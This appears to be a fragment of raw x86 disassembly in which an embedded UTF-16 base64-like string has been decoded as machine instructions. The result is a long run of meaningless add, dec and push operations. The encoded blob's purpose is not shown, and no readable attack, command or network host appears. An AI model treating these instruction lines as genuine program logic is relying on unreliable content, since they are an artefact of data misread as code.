  409936:	00 38                	add    %bh,(%eax)
  409938:	00 45 00             	add    %al,0x0(%ebp)
  40993b:	4c                   	dec    %esp
  40993c:	00 65 00             	add    %ah,0x0(%ebp)
  40993f:	4c                   	dec    %esp
  409940:	00 71 00             	add    %dh,0x0(%ecx)
  409943:	68 00 53 00 55       	push   $0x55005300
  409948:	00 66 00             	add    %ah,0x0(%esi)
  40994b:	79 00                	jns    0x40994d
  40994d:	6a 00                	push   $0x0
  40994f:	47                   	inc    %edi
  409950:	00 52 00             	add    %dl,0x0(%edx)
  409953:	41                   	inc    %ecx
  409954:	00 56 00             	add    %dl,0x0(%esi)
  409957:	4b                   	dec    %ebx
  409958:	00 77 00             	add    %dh,0x0(%edi)
  40995b:	58                   	pop    %eax
  40995c:	00 71 00             	add    %dh,0x0(%ecx)
  40995f:	6a 00                	push   $0x0
  409961:	67 00 31             	add    %dh,(%bx,%di)
  409964:	00 6d 00             	add    %ch,0x0(%ebp)
  409967:	50                   	push   %eax
  409968:	00 34 00             	add    %dh,(%eax,%eax,1)
  40996b:	55                   	push   %ebp
  40996c:	00 45 00             	add    %al,0x0(%ebp)
  40996f:	6d                   	insl   (%dx),%es:(%edi)
  409970:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  409974:	00 39                	add    %bh,(%ecx)
  409976:	00 31                	add    %dh,(%ecx)
  409978:	00 55 00             	add    %dl,0x0(%ebp)
  40997b:	75 00                	jne    0x40997d
  40997d:	48                   	dec    %eax
  40997e:	00 68 00             	add    %ch,0x0(%eax)
  409981:	4f                   	dec    %edi
  409982:	00 6a 00             	add    %ch,0x0(%edx)
  409985:	4f                   	dec    %edi
  409986:	00 48 00             	add    %cl,0x0(%eax)
  409989:	49                   	dec    %ecx
  40998a:	00 66 00             	add    %ah,0x0(%esi)
  40998d:	6a 00                	push   $0x0
  40998f:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  409993:	69 00 44 00 53 00    	imul   $0x530044,(%eax),%eax
  409999:	66 00 47 00          	data16 add %al,0x0(%edi)
  40999d:	75 00                	jne    0x40999f
  40999f:	5a                   	pop    %edx
  4099a0:	00 59 00             	add    %bl,0x0(%ecx)
  4099a3:	43                   	inc    %ebx
  4099a4:	00 53 00             	add    %dl,0x0(%ebx)
  4099a7:	54                   	push   %esp
  4099a8:	00 62 00             	add    %ah,0x0(%edx)
  4099ab:	71 00                	jno    0x4099ad
  4099ad:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4099b1:	62 00                	bound  %eax,(%eax)
  4099b3:	5a                   	pop    %edx
  4099b4:	00 6b 00             	add    %ch,0x0(%ebx)
  4099b7:	67 00 4f 00          	add    %cl,0x0(%bx)
  4099bb:	4a                   	dec    %edx
  4099bc:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  4099c0:	00 4f 00             	add    %cl,0x0(%edi)
  4099c3:	30 00                	xor    %al,(%eax)
  4099c5:	49                   	dec    %ecx
  4099c6:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  4099ca:	00 52 00             	add    %dl,0x0(%edx)
  4099cd:	6c                   	insb   (%dx),%es:(%edi)
  4099ce:	00 58 00             	add    %bl,0x0(%eax)
  4099d1:	4d                   	dec    %ebp
  4099d2:	00 48 00             	add    %cl,0x0(%eax)
  4099d5:	79 00                	jns    0x4099d7
  4099d7:	66 00 37             	data16 add %dh,(%edi)
  4099da:	00 53 00             	add    %dl,0x0(%ebx)
  4099dd:	4b                   	dec    %ebx
  4099de:	00 50 00             	add    %dl,0x0(%eax)
  4099e1:	58                   	pop    %eax
  4099e2:	00 48 00             	add    %cl,0x0(%eax)
  4099e5:	49                   	dec    %ecx
  4099e6:	00 33                	add    %dh,(%ebx)
  4099e8:	00 71 00             	add    %dh,0x0(%ecx)
  4099eb:	41                   	inc    %ecx
  4099ec:	00 32                	add    %dh,(%edx)
  4099ee:	00 6a 00             	add    %ch,0x0(%edx)
  4099f1:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  4099f5:	4d                   	dec    %ebp
  4099f6:	00 75 00             	add    %dh,0x0(%ebp)
  4099f9:	54                   	push   %esp
  4099fa:	00 6a 00             	add    %ch,0x0(%edx)
  4099fd:	2b 00                	sub    (%eax),%eax
  4099ff:	4e                   	dec    %esi
  409a00:	00 38                	add    %bh,(%eax)
  409a02:	00 76 00             	add    %dh,0x0(%esi)
  409a05:	61                   	popa
  409a06:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  409a0a:	00 46 00             	add    %al,0x0(%esi)
  409a0d:	77 00                	ja     0x409a0f
  409a0f:	49                   	dec    %ecx
  409a10:	00 47 00             	add    %al,0x0(%edi)
  409a13:	57                   	push   %edi
  409a14:	00 6f 00             	add    %ch,0x0(%edi)
  409a17:	43                   	inc    %ebx
  409a18:	00 57 00             	add    %dl,0x0(%edi)
  409a1b:	6a 00                	push   $0x0
  409a1d:	37                   	aaa
  409a1e:	00 6b 00             	add    %ch,0x0(%ebx)
  409a21:	4f                   	dec    %edi
  409a22:	00 55 00             	add    %dl,0x0(%ebp)
  409a25:	74 00                	je     0x409a27
  409a27:	43                   	inc    %ebx
  409a28:	00 32                	add    %dh,(%edx)
  409a2a:	00 68 00             	add    %ch,0x0(%eax)
  409a2d:	57                   	push   %edi
  409a2e:	00 70 00             	add    %dh,0x0(%eax)
  409a31:	6e                   	outsb  %ds:(%esi),(%dx)
  409a32:	00 6e 00             	add    %ch,0x0(%esi)
  409a35:	44                   	inc    %esp
  409a36:	00 65 00             	add    %ah,0x0(%ebp)
  409a39:	7a 00                	jp     0x409a3b
  409a3b:	4b                   	dec    %ebx
  409a3c:	00 48 00             	add    %cl,0x0(%eax)
  409a3f:	58                   	pop    %eax
  409a40:	00 76 00             	add    %dh,0x0(%esi)
  409a43:	4c                   	dec    %esp
  409a44:	00 47 00             	add    %al,0x0(%edi)
  409a47:	72 00                	jb     0x409a49
  409a49:	33 00                	xor    (%eax),%eax
  409a4b:	4c                   	dec    %esp
  409a4c:	00 35 00 69 00 75    	add    %dh,0x75006900
  409a52:	00 36                	add    %dh,(%esi)
  409a54:	00 65 00             	add    %ah,0x0(%ebp)
  409a57:	71 00                	jno    0x409a59
  409a59:	51                   	push   %ecx
  409a5a:	00 35 00 48 00 4e    	add    %dh,0x4e004800
  409a60:	00 4b 00             	add    %cl,0x0(%ebx)
  409a63:	57                   	push   %edi
  409a64:	00 70 00             	add    %dh,0x0(%eax)
  409a67:	4c                   	dec    %esp
  409a68:	00 2f                	add    %ch,(%edi)
  409a6a:	00 47 00             	add    %al,0x0(%edi)
  409a6d:	39 00                	cmp    %eax,(%eax)
  409a6f:	39 00                	cmp    %eax,(%eax)
  409a71:	79 00                	jns    0x409a73
  409a73:	75 00                	jne    0x409a75
  409a75:	73 00                	jae    0x409a77
  409a77:	57                   	push   %edi
  409a78:	00 39                	add    %bh,(%ecx)
  409a7a:	00 39                	add    %bh,(%ecx)
  409a7c:	00 69 00             	add    %ch,0x0(%ecx)
  409a7f:	59                   	pop    %ecx
  409a80:	00 39                	add    %bh,(%ecx)
  409a82:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  409a86:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  409a8a:	00 48 00             	add    %cl,0x0(%eax)
  409a8d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a8e:	00 2b                	add    %ch,(%ebx)
  409a90:	00 46 00             	add    %al,0x0(%esi)
  409a93:	57                   	push   %edi
  409a94:	00 37                	add    %dh,(%edi)
  409a96:	00 5a 00             	add    %bl,0x0(%edx)
  409a99:	36 00 33             	add    %dh,%ss:(%ebx)
  409a9c:	00 66 00             	add    %ah,0x0(%esi)
  409a9f:	33 00                	xor    (%eax),%eax
  409aa1:	62 00                	bound  %eax,(%eax)
  409aa3:	46                   	inc    %esi
  409aa4:	00 5a 00             	add    %bl,0x0(%edx)
  409aa7:	76 00                	jbe    0x409aa9
  409aa9:	4a                   	dec    %edx
  409aaa:	00 41 00             	add    %al,0x0(%ecx)
  409aad:	78 00                	js     0x409aaf
  409aaf:	68 00 63 00 67       	push   $0x67006300
  409ab4:	00 4f 00             	add    %cl,0x0(%edi)
  409ab7:	71 00                	jno    0x409ab9
  409ab9:	53                   	push   %ebx
  409aba:	00 42 00             	add    %al,0x0(%edx)
  409abd:	49                   	dec    %ecx
  409abe:	00 4a 00             	add    %cl,0x0(%edx)
  409ac1:	45                   	inc    %ebp
  409ac2:	00 57 00             	add    %dl,0x0(%edi)
  409ac5:	63 00                	arpl   %eax,(%eax)
  409ac7:	6b 00 49             	imul   $0x49,(%eax),%eax
  409aca:	00 78 00             	add    %bh,0x0(%eax)
  409acd:	63 00                	arpl   %eax,(%eax)
  409acf:	32 00                	xor    (%eax),%al
  409ad1:	76 00                	jbe    0x409ad3
  409ad3:	56                   	push   %esi
  409ad4:	00 65 00             	add    %ah,0x0(%ebp)
  409ad7:	4a                   	dec    %edx
  409ad8:	00 55 00             	add    %dl,0x0(%ebp)
  409adb:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  409adf:	2f                   	das
  409ae0:	00 6b 00             	add    %ch,0x0(%ebx)
  409ae3:	61                   	popa
  409ae4:	00 6e 00             	add    %ch,0x0(%esi)
  409ae7:	65 00 32             	add    %dh,%gs:(%edx)
  409aea:	00 4d 00             	add    %cl,0x0(%ebp)
  409aed:	53                   	push   %ebx
  409aee:	00 78 00             	add    %bh,0x0(%eax)
  409af1:	79 00                	jns    0x409af3
  409af3:	31 00                	xor    %eax,(%eax)
  409af5:	42                   	inc    %edx
  409af6:	00 43 00             	add    %al,0x0(%ebx)
  409af9:	69 00 4e 00 67 00    	imul   $0x67004e,(%eax),%eax
  409aff:	52                   	push   %edx
  409b00:	00 31                	add    %dh,(%ecx)
  409b02:	00 4e 00             	add    %cl,0x0(%esi)
  409b05:	51                   	push   %ecx
  409b06:	00 6f 00             	add    %ch,0x0(%edi)
  409b09:	33 00                	xor    (%eax),%eax
  409b0b:	47                   	inc    %edi
  409b0c:	00 5a 00             	add    %bl,0x0(%edx)
  409b0f:	6e                   	outsb  %ds:(%esi),(%dx)
  409b10:	00 7a 00             	add    %bh,0x0(%edx)
  409b13:	6b 00 39             	imul   $0x39,(%eax),%eax
  409b16:	00 33                	add    %dh,(%ebx)
  409b18:	00 41 00             	add    %al,0x0(%ecx)
  409b1b:	42                   	inc    %edx
  409b1c:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  409b20:	00 4d 00             	add    %cl,0x0(%ebp)
  409b23:	34 00                	xor    $0x0,%al
  409b25:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  409b29:	78 00                	js     0x409b2b
  409b2b:	44                   	inc    %esp
  409b2c:	00 4b 00             	add    %cl,0x0(%ebx)
  409b2f:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  409b33:	6b 00 47             	imul   $0x47,(%eax),%eax
  409b36:	00 37                	add    %dh,(%edi)
  409b38:	00 41 00             	add    %al,0x0(%ecx)
  409b3b:	4c                   	dec    %esp
  409b3c:	00 76 00             	add    %dh,0x0(%esi)
  409b3f:	34 00                	xor    $0x0,%al
  409b41:	53                   	push   %ebx
  409b42:	00 35 00 61 00 69    	add    %dh,0x69006100
  409b48:	00 70 00             	add    %dh,0x0(%eax)
  409b4b:	44                   	inc    %esp
  409b4c:	00 34 00             	add    %dh,(%eax,%eax,1)
  409b4f:	59                   	pop    %ecx
  409b50:	00 30                	add    %dh,(%eax)
  409b52:	00 68 00             	add    %ch,0x0(%eax)
  409b55:	4d                   	dec    %ebp
  409b56:	00 73 00             	add    %dh,0x0(%ebx)
  409b59:	55                   	push   %ebp
  409b5a:	00 4b 00             	add    %cl,0x0(%ebx)
  409b5d:	30 00                	xor    %al,(%eax)
  409b5f:	51                   	push   %ecx
  409b60:	00 61 00             	add    %ah,0x0(%ecx)
  409b63:	42                   	inc    %edx
  409b64:	00 47 00             	add    %al,0x0(%edi)
  409b67:	33 00                	xor    (%eax),%eax
  409b69:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  409b6d:	38 00                	cmp    %al,(%eax)
  409b6f:	6b 00 39             	imul   $0x39,(%eax),%eax
  409b72:	00 39                	add    %bh,(%ecx)
  409b74:	00 45 00             	add    %al,0x0(%ebp)
  409b77:	6e                   	outsb  %ds:(%esi),(%dx)
  409b78:	00 32                	add    %dh,(%edx)
  409b7a:	00 63 00             	add    %ah,0x0(%ebx)
  409b7d:	52                   	push   %edx
  409b7e:	00 33                	add    %dh,(%ebx)
  409b80:	00 38                	add    %bh,(%eax)
  409b82:	00 30                	add    %dh,(%eax)
  409b84:	00 57 00             	add    %dl,0x0(%edi)
  409b87:	35 00 6c 00 35       	xor    $0x35006c00,%eax
  409b8c:	00 62 00             	add    %ah,0x0(%edx)
  409b8f:	69 00 6d 00 69 00    	imul   $0x69006d,(%eax),%eax
  409b95:	35 00 57 00 32       	xor    $0x32005700,%eax
  409b9a:	00 5a 00             	add    %bl,0x0(%edx)
  409b9d:	72 00                	jb     0x409b9f
  409b9f:	58                   	pop    %eax
  409ba0:	00 79 00             	add    %bh,0x0(%ecx)
  409ba3:	62 00                	bound  %eax,(%eax)
  409ba5:	71 00                	jno    0x409ba7
  409ba7:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  409bab:	73 00                	jae    0x409bad
  409bad:	6d                   	insl   (%dx),%es:(%edi)
  409bae:	00 50 00             	add    %dl,0x0(%eax)
  409bb1:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  409bb5:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb6:	00 65 00             	add    %ah,0x0(%ebp)
  409bb9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409bbd:	4c                   	dec    %esp
  409bbe:	00 33                	add    %dh,(%ebx)
  409bc0:	00 66 00             	add    %ah,0x0(%esi)
  409bc3:	73 00                	jae    0x409bc5
  409bc5:	64 00 36             	add    %dh,%fs:(%esi)
  409bc8:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  409bcc:	00 6e 00             	add    %ch,0x0(%esi)
  409bcf:	6a 00                	push   $0x0
  409bd1:	46                   	inc    %esi
  409bd2:	00 66 00             	add    %ah,0x0(%esi)
  409bd5:	6b 00 35             	imul   $0x35,(%eax),%eax
  409bd8:	00 77 00             	add    %dh,0x0(%edi)
  409bdb:	31 00                	xor    %eax,(%eax)
  409bdd:	69 00 69 00 39 00    	imul   $0x390069,(%eax),%eax
  409be3:	42                   	inc    %edx
  409be4:	00 48 00             	add    %cl,0x0(%eax)
  409be7:	55                   	push   %ebp
  409be8:	00 2f                	add    %ch,(%edi)
  409bea:	00 65 00             	add    %ah,0x0(%ebp)
  409bed:	42                   	inc    %edx
  409bee:	00 52 00             	add    %dl,0x0(%edx)
  409bf1:	4d                   	dec    %ebp
  409bf2:	00 48 00             	add    %cl,0x0(%eax)
  409bf5:	37                   	aaa
  409bf6:	00 39                	add    %bh,(%ecx)
  409bf8:	00 45 00             	add    %al,0x0(%ebp)
  409bfb:	32 00                	xor    (%eax),%al
  409bfd:	4e                   	dec    %esi
  409bfe:	00 56 00             	add    %dl,0x0(%esi)
  409c01:	35 00 45 00 62       	xor    $0x62004500,%eax
  409c06:	00 31                	add    %dh,(%ecx)
  409c08:	00 75 00             	add    %dh,0x0(%ebp)
  409c0b:	74 00                	je     0x409c0d
  409c0d:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  409c11:	7a 00                	jp     0x409c13
  409c13:	31 00                	xor    %eax,(%eax)
  409c15:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  409c19:	6e                   	outsb  %ds:(%esi),(%dx)
  409c1a:	00 2b                	add    %ch,(%ebx)
  409c1c:	00 7a 00             	add    %bh,0x0(%edx)
  409c1f:	35 00 74 00 45       	xor    $0x45007400,%eax
  409c24:	00 6d 00             	add    %ch,0x0(%ebp)
  409c27:	64 00 37             	add    %dh,%fs:(%edi)
  409c2a:	00 66 00             	add    %ah,0x0(%esi)
  409c2d:	4e                   	dec    %esi
  409c2e:	00 70 00             	add    %dh,0x0(%eax)
  409c31:	33 00                	xor    (%eax),%eax
  409c33:	6a 00                	push   $0x0
  409c35:	39 00                	cmp    %eax,(%eax)
  409c37:	75 00                	jne    0x409c39
  409c39:	68 00 50 00 6c       	push   $0x6c005000
  409c3e:	00 6b 00             	add    %ch,0x0(%ebx)
  409c41:	6c                   	insb   (%dx),%es:(%edi)
  409c42:	00 56 00             	add    %dl,0x0(%esi)
  409c45:	6c                   	insb   (%dx),%es:(%edi)
  409c46:	00 63 00             	add    %ah,0x0(%ebx)
  409c49:	65 00 2f             	add    %ch,%gs:(%edi)
  409c4c:	00 4d 00             	add    %cl,0x0(%ebp)
  409c4f:	54                   	push   %esp
  409c50:	00 52 00             	add    %dl,0x0(%edx)
  409c53:	68 00 2b 00 34       	push   $0x34002b00
  409c58:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c5b:	2f                   	das
  409c5c:	00 41 00             	add    %al,0x0(%ecx)
  409c5f:	33 00                	xor    (%eax),%eax
  409c61:	72 00                	jb     0x409c63
  409c63:	41                   	inc    %ecx
  409c64:	00 70 00             	add    %dh,0x0(%eax)
  409c67:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  409c6b:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6c:	00 41 00             	add    %al,0x0(%ecx)
  409c6f:	73 00                	jae    0x409c71
  409c71:	4f                   	dec    %edi
  409c72:	00 75 00             	add    %dh,0x0(%ebp)
  409c75:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  409c79:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  409c7d:	6d                   	insl   (%dx),%es:(%edi)
  409c7e:	00 31                	add    %dh,(%ecx)
  409c80:	00 5a 00             	add    %bl,0x0(%edx)
  409c83:	4a                   	dec    %edx
  409c84:	00 62 00             	add    %ah,0x0(%edx)
  409c87:	37                   	aaa
  409c88:	00 49 00             	add    %cl,0x0(%ecx)
  409c8b:	59                   	pop    %ecx
  409c8c:	00 6f 00             	add    %ch,0x0(%edi)
  409c8f:	32 00                	xor    (%eax),%al
  409c91:	4b                   	dec    %ebx
  409c92:	00 7a 00             	add    %bh,0x0(%edx)
  409c95:	38 00                	cmp    %al,(%eax)
  409c97:	34 00                	xor    $0x0,%al
  409c99:	2b 00                	sub    (%eax),%eax
  409c9b:	57                   	push   %edi
  409c9c:	00 66 00             	add    %ah,0x0(%esi)
  409c9f:	56                   	push   %esi
  409ca0:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409ca4:	00 2b                	add    %ch,(%ebx)
  409ca6:	00 48 00             	add    %cl,0x0(%eax)
  409ca9:	50                   	push   %eax
  409caa:	00 68 00             	add    %ch,0x0(%eax)
  409cad:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  409cb1:	76 00                	jbe    0x409cb3
  409cb3:	41                   	inc    %ecx
  409cb4:	00 38                	add    %bh,(%eax)
  409cb6:	00 39                	add    %bh,(%ecx)
  409cb8:	00 51 00             	add    %dl,0x0(%ecx)
  409cbb:	79 00                	jns    0x409cbd
  409cbd:	6d                   	insl   (%dx),%es:(%edi)
  409cbe:	00 4b 00             	add    %cl,0x0(%ebx)
  409cc1:	4d                   	dec    %ebp
  409cc2:	00 57 00             	add    %dl,0x0(%edi)
  409cc5:	30 00                	xor    %al,(%eax)
  409cc7:	4f                   	dec    %edi
  409cc8:	00 70 00             	add    %dh,0x0(%eax)
  409ccb:	2b 00                	sub    (%eax),%eax
  409ccd:	52                   	push   %edx
  409cce:	00 38                	add    %bh,(%eax)
  409cd0:	00 4d 00             	add    %cl,0x0(%ebp)
  409cd3:	68 00 57 00 38       	push   $0x38005700
  409cd8:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  409cdc:	00 65 00             	add    %ah,0x0(%ebp)
  409cdf:	47                   	inc    %edi
  409ce0:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ce3:	5a                   	pop    %edx
  409ce4:	00 70 00             	add    %dh,0x0(%eax)
  409ce7:	76 00                	jbe    0x409ce9
  409ce9:	46                   	inc    %esi
  409cea:	00 77 00             	add    %dh,0x0(%edi)
  409ced:	30 00                	xor    %al,(%eax)
  409cef:	79 00                	jns    0x409cf1
  409cf1:	4c                   	dec    %esp
  409cf2:	00 58 00             	add    %bl,0x0(%eax)
  409cf5:	4d                   	dec    %ebp
  409cf6:	00 57 00             	add    %dl,0x0(%edi)
  409cf9:	61                   	popa
  409cfa:	00 63 00             	add    %ah,0x0(%ebx)
  409cfd:	4f                   	dec    %edi
  409cfe:	00 58 00             	add    %bl,0x0(%eax)
  409d01:	2b 00                	sub    (%eax),%eax
  409d03:	2b 00                	sub    (%eax),%eax
  409d05:	53                   	push   %ebx
  409d06:	00 57 00             	add    %dl,0x0(%edi)
  409d09:	7a 00                	jp     0x409d0b
  409d0b:	32 00                	xor    (%eax),%al
  409d0d:	59                   	pop    %ecx
  409d0e:	00 56 00             	add    %dl,0x0(%esi)
  409d11:	54                   	push   %esp
  409d12:	00 57 00             	add    %dl,0x0(%edi)
  409d15:	78 00                	js     0x409d17
  409d17:	59                   	pop    %ecx
  409d18:	00 57 00             	add    %dl,0x0(%edi)
  409d1b:	62 00                	bound  %eax,(%eax)
  409d1d:	72 00                	jb     0x409d1f
  409d1f:	5a                   	pop    %edx
  409d20:	00 36                	add    %dh,(%esi)
  409d22:	00 75 00             	add    %dh,0x0(%ebp)
  409d25:	5a                   	pop    %edx
  409d26:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  409d2a:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  409d2e:	00 32                	add    %dh,(%edx)
  409d30:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409d34:	00 72 00             	add    %dh,0x0(%edx)
  409d37:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409d3b:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  409d3f:	30 00                	xor    %al,(%eax)
  409d41:	68 00 5a 00 38       	push   $0x38005a00
  409d46:	00 50 00             	add    %dl,0x0(%eax)
  409d49:	56                   	push   %esi
  409d4a:	00 4f 00             	add    %cl,0x0(%edi)
  409d4d:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  409d51:	6c                   	insb   (%dx),%es:(%edi)
  409d52:	00 43 00             	add    %al,0x0(%ebx)
  409d55:	48                   	dec    %eax
  409d56:	00 61 00             	add    %ah,0x0(%ecx)
  409d59:	58                   	pop    %eax
  409d5a:	00 59 00             	add    %bl,0x0(%ecx)
  409d5d:	54                   	push   %esp
  409d5e:	00 78 00             	add    %bh,0x0(%eax)
  409d61:	38 00                	cmp    %al,(%eax)
  409d63:	75 00                	jne    0x409d65
  409d65:	49                   	dec    %ecx
  409d66:	00 71 00             	add    %dh,0x0(%ecx)
  409d69:	74 00                	je     0x409d6b
  409d6b:	77 00                	ja     0x409d6d
  409d6d:	6f                   	outsl  %ds:(%esi),(%dx)
  409d6e:	00 79 00             	add    %bh,0x0(%ecx)
  409d71:	55                   	push   %ebp
  409d72:	00 6d 00             	add    %ch,0x0(%ebp)
  409d75:	78 00                	js     0x409d77
  409d77:	31 00                	xor    %eax,(%eax)
  409d79:	50                   	push   %eax
  409d7a:	00 52 00             	add    %dl,0x0(%edx)
  409d7d:	30 00                	xor    %al,(%eax)
  409d7f:	37                   	aaa
  409d80:	00 38                	add    %bh,(%eax)
  409d82:	00 4b 00             	add    %cl,0x0(%ebx)
  409d85:	36 00 54 00 42       	add    %dl,%ss:0x42(%eax,%eax,1)
  409d8a:	00 77 00             	add    %dh,0x0(%edi)
  409d8d:	58                   	pop    %eax
  409d8e:	00 52 00             	add    %dl,0x0(%edx)
  409d91:	42                   	inc    %edx
  409d92:	00 47 00             	add    %al,0x0(%edi)
  409d95:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  409d99:	61                   	popa
  409d9a:	00 66 00             	add    %ah,0x0(%esi)
  409d9d:	74 00                	je     0x409d9f
  409d9f:	61                   	popa
  409da0:	00 77 00             	add    %dh,0x0(%edi)
  409da3:	36 00 2b             	add    %ch,%ss:(%ebx)
  409da6:	00 78 00             	add    %bh,0x0(%eax)
  409da9:	6d                   	insl   (%dx),%es:(%edi)
  409daa:	00 68 00             	add    %ch,0x0(%eax)
  409dad:	34 00                	xor    $0x0,%al
  409daf:	6d                   	insl   (%dx),%es:(%edi)
  409db0:	00 37                	add    %dh,(%edi)
  409db2:	00 79 00             	add    %bh,0x0(%ecx)
  409db5:	45                   	inc    %ebp
  409db6:	00 46 00             	add    %al,0x0(%esi)
  409db9:	43                   	inc    %ebx
  409dba:	00 33                	add    %dh,(%ebx)
  409dbc:	00 30                	add    %dh,(%eax)
  409dbe:	00 4e 00             	add    %cl,0x0(%esi)
  409dc1:	4d                   	dec    %ebp
  409dc2:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  409dc6:	00 4b 00             	add    %cl,0x0(%ebx)
  409dc9:	57                   	push   %edi
  409dca:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  409dce:	00 35 00 33 00 77    	add    %dh,0x77003300
  409dd4:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  409dd8:	00 72 00             	add    %dh,0x0(%edx)
  409ddb:	50                   	push   %eax
  409ddc:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  409de0:	00 34 00             	add    %dh,(%eax,%eax,1)
  409de3:	72 00                	jb     0x409de5
  409de5:	33 00                	xor    (%eax),%eax
  409de7:	2f                   	das
  409de8:	00 2b                	add    %ch,(%ebx)
  409dea:	00 43 00             	add    %al,0x0(%ebx)
  409ded:	61                   	popa
  409dee:	00 35 00 4b 00 50    	add    %dh,0x50004b00
  409df4:	00 65 00             	add    %ah,0x0(%ebp)
  409df7:	50                   	push   %eax
  409df8:	00 2b                	add    %ch,(%ebx)
  409dfa:	00 34 00             	add    %dh,(%eax,%eax,1)
  409dfd:	78 00                	js     0x409dff
  409dff:	43                   	inc    %ebx
  409e00:	00 2b                	add    %ch,(%ebx)
  409e02:	00 6d 00             	add    %ch,0x0(%ebp)
  409e05:	43                   	inc    %ebx
  409e06:	00 53 00             	add    %dl,0x0(%ebx)
  409e09:	35 00 39 00 73       	xor    $0x73003900,%eax
  409e0e:	00 77 00             	add    %dh,0x0(%edi)
  409e11:	50                   	push   %eax
  409e12:	00 47 00             	add    %al,0x0(%edi)
  409e15:	32 00                	xor    (%eax),%al
  409e17:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  409e1b:	67 00 32             	add    %dh,(%bp,%si)
  409e1e:	00 6e 00             	add    %ch,0x0(%esi)
  409e21:	75 00                	jne    0x409e23
  409e23:	70 00                	jo     0x409e25
  409e25:	47                   	inc    %edi
  409e26:	00 56 00             	add    %dl,0x0(%esi)
  409e29:	6d                   	insl   (%dx),%es:(%edi)
  409e2a:	00 67 00             	add    %ah,0x0(%edi)
  409e2d:	49                   	dec    %ecx
  409e2e:	00 59 00             	add    %bl,0x0(%ecx)
  409e31:	34 00                	xor    $0x0,%al
  409e33:	43                   	inc    %ebx
  409e34:	00 79 00             	add    %bh,0x0(%ecx)
  409e37:	47                   	inc    %edi
  409e38:	00 71 00             	add    %dh,0x0(%ecx)
  409e3b:	2b 00                	sub    (%eax),%eax
  409e3d:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  409e41:	51                   	push   %ecx
  409e42:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  409e46:	00 5a 00             	add    %bl,0x0(%edx)
  409e49:	68 00 72 00 39       	push   $0x39007200
  409e4e:	00 35 00 33 00 64    	add    %dh,0x64003300
  409e54:	00 32                	add    %dh,(%edx)
  409e56:	00 75 00             	add    %dh,0x0(%ebp)
  409e59:	71 00                	jno    0x409e5b
  409e5b:	76 00                	jbe    0x409e5d
  409e5d:	36 00 4c 00 73       	add    %cl,%ss:0x73(%eax,%eax,1)
  409e62:	00 39                	add    %bh,(%ecx)
  409e64:	00 55 00             	add    %dl,0x0(%ebp)
  409e67:	30 00                	xor    %al,(%eax)
  409e69:	35 00 35 00 36       	xor    $0x36003500,%eax
  409e6e:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  409e72:	00 67 00             	add    %ah,0x0(%edi)
  409e75:	53                   	push   %ebx
  409e76:	00 56 00             	add    %dl,0x0(%esi)
  409e79:	33 00                	xor    (%eax),%eax
  409e7b:	68 00 4c 00 31       	push   $0x31004c00
  409e80:	00 56 00             	add    %dl,0x0(%esi)
  409e83:	70 00                	jo     0x409e85
  409e85:	70 00                	jo     0x409e87
  409e87:	4c                   	dec    %esp
  409e88:	00 79 00             	add    %bh,0x0(%ecx)
  409e8b:	77 00                	ja     0x409e8d
  409e8d:	76 00                	jbe    0x409e8f
  409e8f:	61                   	popa
  409e90:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e93:	30 00                	xor    %al,(%eax)
  409e95:	43                   	inc    %ebx
  409e96:	00 48 00             	add    %cl,0x0(%eax)
  409e99:	76 00                	jbe    0x409e9b
  409e9b:	53                   	push   %ebx
  409e9c:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  409ea0:	00 6a 00             	add    %ch,0x0(%edx)
  409ea3:	42                   	inc    %edx
  409ea4:	00 4b 00             	add    %cl,0x0(%ebx)
  409ea7:	48                   	dec    %eax
  409ea8:	00 32                	add    %dh,(%edx)
  409eaa:	00 53 00             	add    %dl,0x0(%ebx)
  409ead:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  409eb1:	4c                   	dec    %esp
  409eb2:	00 51 00             	add    %dl,0x0(%ecx)
